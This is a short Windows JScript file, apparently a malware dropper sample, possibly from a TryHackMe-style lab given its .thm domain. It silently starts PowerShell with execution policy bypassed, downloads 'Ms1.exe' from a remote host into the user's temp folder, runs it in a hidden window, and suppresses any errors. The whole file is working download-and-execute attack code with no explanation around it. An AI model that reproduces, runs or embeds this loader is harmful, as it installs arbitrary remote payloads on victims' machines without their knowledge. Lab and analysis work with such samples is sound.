var wsh = new ActiveXObject("WScript.Shell");
var fsys = new ActiveXObject("Scripting.FileSystemObject");

try {
    var sysCache = wsh.ExpandEnvironmentStrings("%TEMP%");
    
    if (!fsys.FolderExists(sysCache)) {
        fsys.CreateFolder(sysCache);
    }
    
    var binPath = sysCache + "\\Ms1.exe";
    
    var fetchCmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'http://brightlinesec-careers.thm/Ms1.exe' -OutFile '" + binPath + "'\"";
    
    wsh.Run(fetchCmd, 0, true);
    
    wsh.Run(binPath, 0, false);

} catch (e) {
}